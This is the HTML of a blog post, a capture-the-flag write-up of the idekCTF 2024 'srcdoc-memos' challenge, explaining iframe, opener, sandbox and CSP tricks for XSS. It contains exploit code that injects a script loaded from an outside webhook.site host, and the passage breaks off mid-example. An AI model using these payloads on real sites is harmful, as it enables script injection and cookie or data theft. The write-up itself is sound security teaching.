@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>idekCTF 2024 Writeup - Advanced iframe Magic - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+            
+<link href="https://blog.huli.tw/2024/09/07/idek-ctf-2024-iframe/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/">
+    
+
+
+
+
+
+    <meta name="description" content="In idekCTF 2024, there was an interesting problem called srcdoc-memos from @icesfont, which involved a lot of knowledge related to iframes. I did not actually participate in the competition, but after">
+<meta property="og:type" content="article">
+<meta property="og:title" content="idekCTF 2024 Writeup - Advanced iframe Magic">
+<meta property="og:url" content="https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="In idekCTF 2024, there was an interesting problem called srcdoc-memos from @icesfont, which involved a lot of knowledge related to iframes. I did not actually participate in the competition, but after">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/idek-ctf-2024-iframe/cover-en.png">
+<meta property="article:published_time" content="2024-09-07T02:40:00.000Z">
+<meta property="article:modified_time" content="2024-09-07T04:49:56.664Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/idek-ctf-2024-iframe/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="idekCTF 2024 Writeup - Advanced iframe Magic" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=4.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#srcdoc-memos">1&nbsp;&nbsp;<b>srcdoc-memos</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#difficulties">2&nbsp;&nbsp;<b>Difficulties</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#solution">3&nbsp;&nbsp;<b>Solution</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#1-navigation-of-iframes">3.1&nbsp;&nbsp;1. Navigation of iframes</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#2-iframe-reparenting-and-bfcache">3.2&nbsp;&nbsp;2. iframe reparenting and bfcache</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#3-inheritance-of-csp">3.3&nbsp;&nbsp;3. Inheritance of CSP</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#putting-it-all-together">3.4&nbsp;&nbsp;Putting It All Together</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#summary">4&nbsp;&nbsp;<b>Summary</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2024/09/07/idek-ctf-2024-iframe/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            idekCTF 2024 Writeup - Advanced iframe Magic
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2024-09-07T02:40:00.000Z" itemprop="datePublished">7 September 2024</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>In idekCTF 2024, there was an interesting problem called srcdoc-memos from @icesfont, which involved a lot of knowledge related to iframes. I did not actually participate in the competition, but after the event, I looked at the problem and the solution, and it took me several days to finally understand why. It is definitely worth documenting the process and the solution.</p>
+<p>Since this problem involves a lot of knowledge related to iframes, I will try to explain it step by step for better understanding.</p>
+<span id="more"></span>
+
+<h2><span id="srcdoc-memos">srcdoc-memos</span></h2><p>Problem link: <a target="_blank" rel="noopener" href="https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos">https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos</a></p>
+<p>The code for this problem is as follows, with the goal of achieving XSS to steal a pre-set flag:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">escape</span> <span class="token operator">=</span> <span class="token parameter">html</span> <span class="token operator">=></span> html
+  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">handler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token string">"http://localhost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">let</span> memo<span class="token punctuation">;</span>
+
+  <span class="token keyword">switch</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">case</span> <span class="token string">"/"</span><span class="token operator">:</span>
+    memo <span class="token operator">=</span>
+      cookie<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>cookie <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>memo <span class="token operator">??</span>
+      <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h2>Welcome to srcdoc memos!&lt;/h2>\n&lt;p>HTML is supported&lt;/p></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+&lt;script>
+document.head.insertAdjacentHTML(
+  "beforeend",
+  \`&lt;meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
+);
+if (window.opener !== null) &#123;
+  console.error("has opener");
+  document.documentElement.remove();
+&#125;
+&lt;/script>
+
+&lt;h1>srcdoc memos&lt;/h1>
+&lt;div class="horizontal">
+  &lt;iframe srcdoc="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/iframe>
+  &lt;textarea name="memo" placeholder="&lt;b>TODO&lt;/b>: ..." form="update"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/textarea>
+&lt;/div>
+&lt;form id="update" action="/memo">
+  &lt;input type="submit" value="update memo">
+&lt;/form>
+    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">case</span> <span class="token string">"/memo"</span><span class="token operator">:</span>
+    memo <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"memo"</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span>statusCode <span class="token operator">=</span> <span class="token number">302</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> cookie<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token string">"memo"</span><span class="token punctuation">,</span> memo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">default</span><span class="token operator">:</span>
+    res<span class="token punctuation">.</span>statusCode <span class="token operator">=</span> <span class="token number">404</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The functionality of the problem itself is quite simple. There is an API <code>/memo?memo=xxx</code> that can set cookies, and when accessing the index page, the content will be placed in <code>srcdoc</code>. But the most important part is that there is a script on the same page:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">insertAdjacentHTML</span><span class="token punctuation">(</span>
+  <span class="token string">"beforeend"</span><span class="token punctuation">,</span>
+  \`<span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"Content-Security-Policy"</span> content<span class="token operator">=</span><span class="token string">"script-src 'none';"</span><span class="token operator">></span>\`
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>opener <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"has opener"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It mainly does two things:</p>
+<ol>
+<li>Adds <code>script-src &#39;none&#39;</code> CSP</li>
+<li>If there is an opener, it removes the content</li>
+</ol>
+<h2><span id="difficulties">Difficulties</span></h2><p>Let’s not worry about the opener for now; that one is easier to solve. The difficult part is the CSP.</p>
+<p>After reading the problem, my thought process was as follows: since the CSP of <code>&lt;iframe srcdoc&gt;</code> inherits from its parent, if the upper layer has it, the lower layer must have it too. Therefore, we need to find a way to remove that CSP. Since we want to remove it, the only way I could think of is to add CSP through the <code>&lt;iframe csp&gt;</code> attribute, which can prevent that script from loading.</p>
+<p>However, since the content of this problem is brought in through cookies, there will be same-site cookie restrictions. We cannot insert an iframe in our origin; the cookies will have issues. Therefore, we must use <code>&lt;iframe csp&gt;</code> at the problem’s origin. Other than this, I can’t think of any way to remove the CSP.</p>
+<h2><span id="solution">Solution</span></h2><p>The reason I said the opener is easier to solve is that I have seen similar problems before.</p>
+<p>There are a few methods to make the opener null. The first one is similar to what appeared in <a href="https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/#obligatory-calc">SekaiCTF 2022 - Obligatory Calc</a>. After executing <code>window.open</code>, quickly close itself, and <code>opener</code> will be null. The author of this problem, icesfont, used this method (if you test it in the console, you will find that nothing happens after execution because browsers by default cannot open a new window without user interaction, so the second open will be blocked):</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+    &lt;script>
+      open("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">", "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">");
+      window.close();
+    &lt;\/script>
+  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"text/html"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The second method I saw proposed by Jazzy in Discord is actually just to set the opener to null after opening:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+  w<span class="token punctuation">.</span>opener <span class="token operator">=</span> <span class="token keyword">null</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The reason this works is that right after opening, there is a short period when the opened window and the current window are same-origin, so during this time, it can be manipulated, and then it will be redirected to the desired URL.</p>
+<p>Although the opener is lost, it seems to be disconnected from the opened window, but actually, it can be accessed again using the <code>name</code> attribute. I have written about this before: <a href="https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/#windowopen">iframe and window.open magic</a>.</p>
+<p>After solving the opener issue, we can look at the other most troublesome part, which is that script. If we can prevent it from executing, it would be easy to achieve XSS. But how can we prevent it from executing? I have previously <a href="https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/#iframes-csp">written</a> that there is an attribute called <code>csp</code> on iframes, and by adding it, we can set the CSP.</p>
+<p>As mentioned earlier, due to same-site cookies, we need to directly use the problem’s memo function to embed it. The code is as follows(modified from the exploit posted by Jazzy in Discord channel):</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  <span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span>
+  <span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+    w<span class="token punctuation">.</span>opener <span class="token operator">=</span> <span class="token keyword">null</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">let</span> html <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+    html
+    &lt;script src="http://webhook.site/0fdd5e6d-0882-44de-b593-212aecf604c1">&lt;\/script>
+    &lt;iframe csp="script-src http: https:" src="/">&lt;/iframe>
+  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+
+  <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'main'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Using CSP to prevent inline scripts from executing, and then reloading the webpage, will execute the originally prepared script. However, I actually tried it, and the latest version will have an error:</p>
+<blockquote>
+<p>Refused to display ‘<a target="_blank" rel="noopener" href="http://localhost:1337/">http://localhost:1337/</a>‘ in a frame. The embedder requires it to enforce the following Content Security Policy: ‘script-src http: https:’. However, the frame neither accepts that policy using the Allow-CSP-From header nor delivers a Content Security Policy which is at least as strong as that one.</p>
+</blockquote>
+<p>If the page originally does not have a CSP, it cannot be forcibly added. From post-match discussions, it seems that older versions of Chrome have less strict restrictions on same-origin CSP, so it can only work in older versions (though I’m not sure, and I’m too lazy to find an old version to test).</p>
+<p>Next, let’s talk about the expected solution, which involves a lot of knowledge related to iframes. I spent about a week gradually understanding why the expected solution can work. To make it easier to understand, I broke it down into several small parts, and following along should help you understand the final expected solution.</p>
+<h3><span id="1-navigation-of-iframes">1. Navigation of iframes</span></h3><p>Since an iframe is an independent window, it can also perform navigation to other places. Suppose there is an iframe on the webpage, and its original src is A. If you change the src to B, what happens when you press the back button (or execute <code>history.back()</code>)? There are two possibilities:</p>
+<ol>
+<li>The entire webpage (top level) goes back to the previous page.</li>
+<li>The iframe goes back to the previous page (from B to A).</li>
+</ol>
+<p>The answer is 2, meaning that when you perform navigation, the iframe’s history will also be added to the overall history.</p>
+<p>Knowing this premise, we can look at a situation:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;\/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    f<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>
+  <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li>First, load test1 into the iframe and add a sandbox, so the script will not execute.</li>
+<li>Press the loadTest2 button to remove the iframe’s sandbox and navigate to test2, so the script will execute.</li>
+</ol>
+<p>At this point, if you press the back button, the iframe will naturally return to test1. However, the sandbox may have two situations:</p>
+<ol>
+<li>The sandbox also returns to the state when loading test1.</li>
+<li>The sandbox maintains its current properties, meaning there is no sandbox.</li>
+</ol>
+<p>The answer will be 2; the sandbox’s properties do not change. Therefore, after pressing back, the sandbox is gone, and the script in test1 can now execute.</p>
+<p>It actually feels quite reasonable, after all, you only changed the src, and did not modify the sandbox, so the sandbox remains in its latest state.</p>
+<h3><span id="2-iframe-reparenting-and-bfcache">2. iframe reparenting and bfcache</span></h3><p>The previous situation involved changing the sandbox and loading a new src, then going back to the previous page. Next, let’s look at another situation where the first half is the same, but after loading a new src, we do not directly go back to the previous page; instead, we first navigate the entire webpage to another page and then go back:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;\/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">location <span class="token operator">=</span> <span class="token string">'a.html'</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
